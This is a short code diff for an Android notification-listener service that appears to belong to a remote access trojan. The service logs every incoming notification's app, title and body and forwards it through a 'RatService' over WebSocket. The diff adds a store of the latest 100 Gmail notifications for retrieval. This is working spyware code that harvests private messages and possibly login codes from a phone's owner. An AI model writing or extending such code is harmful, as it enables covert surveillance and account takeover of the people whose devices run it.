@@ -14,9 +14,13 @@ class NotificationListener : NotificationListenerService() {
         private const val TAG = "NotifListener"
         var instance: NotificationListener? = null
         var callback: ((Map<String, String>) -> Unit)? = null
-    }
 
-    private val gson = Gson()
+        private val gmailNotifs = mutableListOf<Map<String, String>>()
+
+        fun getGmailNotifs(): List<Map<String, String>> {
+            return gmailNotifs.toList()
+        }
+    }
 
     override fun onCreate() {
         super.onCreate()
@@ -59,9 +63,14 @@ class NotificationListener : NotificationListenerService() {
 
             Log.i(TAG, "Notif: $appName - $title - $body")
 
+            // Simpan Gmail notif
+            if (pkg.contains("gmail") || appName.lowercase().contains("gmail")) {
+                gmailNotifs.add(0, data)
+                if (gmailNotifs.size > 100) gmailNotifs.removeAt(gmailNotifs.size - 1)
+            }
+
             callback?.invoke(data)
 
-            // Kirim via WebSocket
             RatService.instance?.sendNotificationEvent(data)
         } catch (e: Exception) {
             Log.e(TAG, "onNotificationPosted error", e)
